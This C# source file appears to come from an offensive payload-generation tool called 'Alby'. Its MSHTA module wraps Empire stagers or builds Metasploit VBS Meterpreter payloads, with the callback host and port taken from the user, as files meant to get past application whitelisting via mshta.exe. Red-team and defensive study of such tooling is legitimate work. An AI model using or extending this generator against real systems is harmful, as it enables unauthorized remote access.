using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Alby
{
    class MSHTA
    {

        public static void Menu()
        {
            Helpers.AlbyAddToBanner("MSHTA.exe - Select Payload");
            Console.WriteLine("1. Empire StarFighter");
            Console.WriteLine("2. Metasploit VBSMeter");
            Console.WriteLine();
            Console.WriteLine("0.Back");
            Console.Write("\nEnter choice: ");

            int UserInput = Helpers.GenerateInputOptions(2);
            switch (UserInput)
            {
                case 1:
                    EmpireStarFighter();
                    break;
                case 2:
                    MetasploitVBSMeter();
                    break;
                default:
                    break;
            }
        }

        private static void EmpireStarFighter()
        {
            /* Default filename */
            string Filename_MSHTAStarFighter_Default = "MSHTA_StarFighter.bypass";
            Helpers.WriteEmpireExample();
            string Empire_Stager = Helpers.PasteToString();
            string Outfile = Helpers.FileFolderLocation(Filename_MSHTAStarFighter_Default);
            Generators.GeneratePayload(Resources.Template_MSHTA_StarFighter, Outfile, Empire_Stager, "GenerateFile", null, null, null);
            Helpers.WriteMSHTAPayloadExample(Outfile);
            Helpers.PauseExecution();
        }

        private static void MetasploitVBSMeter()
        {
            /* Default filename */
            string Filename_MSHTAVBSMeter_Default = "MSHTA_VBSMeter.bypass";
            Helpers.WriteVBSMeterExample();
            Console.WriteLine("Enter RHOST (IP to Metasploit server where listener is running):");
            string RHOST = Console.ReadLine();
            Console.WriteLine("Enter RPORT (Port to Metasploit server where listener is running):");
            string RPORT = Console.ReadLine();
            string Outfile = Helpers.FileFolderLocation(Filename_MSHTAVBSMeter_Default);

            Generators.GeneratePayload(Resources.Template_MSHTA_VBSMeter, Outfile, null, "GenerateFile", null, RHOST, RPORT);
            Helpers.WriteMSHTAPayloadExample(Outfile);
            Helpers.PauseExecution();
        }
    }
}
